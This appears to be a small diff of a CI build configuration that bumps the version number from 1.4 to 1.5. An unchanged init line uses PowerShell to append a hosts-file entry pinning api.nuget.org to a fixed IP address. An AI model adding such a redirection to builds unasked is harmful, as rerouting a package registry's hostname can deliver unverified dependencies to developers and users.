@@ -1,4 +1,4 @@
-version: 1.4.{build}
+version: 1.5.{build}
 init:
 - ps: '[System.IO.File]::AppendAllText("C:\Windows\System32\drivers\etc\hosts", "`n93.184.221.200  api.nuget.org")'
 build_script:
